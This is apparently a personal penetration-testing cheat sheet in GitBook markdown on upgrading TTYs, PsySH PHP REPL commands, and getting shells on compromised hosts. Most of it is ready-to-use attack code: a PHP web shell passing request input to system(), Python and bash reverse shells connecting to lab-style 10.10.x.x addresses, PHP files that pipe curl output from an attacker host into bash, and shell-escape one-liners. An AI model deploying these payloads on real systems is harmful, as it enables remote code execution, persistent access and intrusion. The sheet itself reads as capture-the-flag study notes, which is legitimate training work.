---
icon: book-skull
description: Teletypewriters and Shells
---

# Shells/TTYs

{% hint style="info" %}
## <mark style="color:purple;">`TTYs`</mark>

### <mark style="color:purple;">Ncat</mark>

* <mark style="color:purple;">You can use the</mark> <mark style="color:orange;">**`rlwrap`**</mark> <mark style="color:purple;">utility to</mark> <mark style="color:purple;">enable line editing and history.</mark>
* <mark style="color:purple;">In order to have a full</mark> <mark style="color:orange;">**`TTY`**</mark> <mark style="color:purple;">**follow this steps:**</mark>

#### <mark style="color:orange;">`BASH`</mark><mark style="color:purple;">:</mark>

1. <mark style="color:purple;">`python3 -c 'import pty; pty.spawn("/bin/bash")'`</mark>
2. &#x20;<mark style="color:purple;">`CTRL+Z`</mark>
3. <mark style="color:purple;">`stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`</mark>

<mark style="color:orange;">**`ZSH`**</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Same first two steps and then:</mark>

{% code overflow="wrap" %}
```bash
stty raw -echo; fg %1; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}
{% endhint %}

***

## <mark style="color:purple;">Shells</mark>

{% hint style="info" %}
## <mark style="color:purple;">`PSY`</mark>

* <mark style="color:orange;">**`PSY`**</mark> <mark style="color:purple;">Shell is an interactive</mark> <mark style="color:orange;">**`PHP REPL (Read-Eval-Print Loop)`**</mark> <mark style="color:purple;">used normally for debugging.</mark>

***

### <mark style="color:purple;">Useful Commands:</mark>

{% code title="Very handy" %}
```sh
help
```
{% endcode %}

{% code title="Print the working directory" %}
```php
getcwd()
```
{% endcode %}

{% code title="Print the current user" %}
```php
get_current_user()
```
{% endcode %}

{% code title="Print system info" %}
```php
phpinfo()
```
{% endcode %}

{% code title="Print contents from directory" %}
```php
scandir("/home")
```
{% endcode %}

{% code title="Print content from file" %}
```php
file_get_contents("/etc/os-release")
```
{% endcode %}

* <mark style="color:purple;">If there are break line characters like</mark> <mark style="color:orange;">**`/n`**</mark> <mark style="color:purple;">and you want to get ride of then:</mark>

```php
echo file_get_contents("/home/nairobi/ca.key")
```
{% endhint %}

***

{% hint style="warning" %}
## Web Shells

### <mark style="color:orange;">`PHP`</mark>

{% code title="Standard shell" %}
```php
<?php system($_REQUEST['cmd']); ?>
```
{% endcode %}

{% code title="Create cmd.php" %}
```bash
echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Reverse Shells</mark>

### <mark style="color:purple;">Python Reverse Shells</mark>

#### <mark style="color:purple;">One liners</mark>

{% code title="Uses pty  " overflow="wrap" %}
```sh
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
{% endcode %}

{% code title="Uses subprocess" overflow="wrap" %}
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

#### <mark style="color:purple;">Create the shell file</mark>

{% code title="Uses pty " overflow="wrap" %}
```sh
echo 'import pty
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.16.6", 4444))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/bash")
s.close()' > shell.py
```
{% endcode %}

{% code title="Uses subprocess " overflow="wrap" %}
```bash
echo 'import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.157", 1235))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
subprocess.call(["/bin/sh", "-i"])
s.close()' > shell.py
```
{% endcode %}
{% endhint %}









Spawning Shells

```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
python3 -c 'import pty; pty.spawn("/bin/sh")'

script -qc /bin/bash /dev/null

echo os.system('/bin/bash') 
/bin/sh -i 
perl -e 'exec "/bin/sh";' 
perl: exec "/bin/sh"; 
ruby: exec "/bin/sh" 
lua: os.execute('/bin/sh') 
exec "/bin/sh"; 
/bin/bash -i
exec "/bin/sh"                # (From within IRB) 
:!bash                        # (From within vi)
:set shell=/bin/bash:shell    # (From within vi) 
!sh                           # (From within nmap)
```





***



HTTP

```bash
With Url:
<http://10.10.14.14/$>(bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1')
```

PHP

```bash
#For index.php files
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");?>

#To copy inside a file
echo '<?php system("curl <http://10.10.14.16:443/rev.sh> | bash"); ?>' > hola.php

```

BASH + PHP

```bash
#Create the rev shell first

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.16/443 0>&1

#Copy it in to file with at http server
echo '<?php system("curl <http://10.10.14.16:80/hey> | bash"); ?>'
```

Standard [shell.sh](http://shell.sh)

```c
bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```

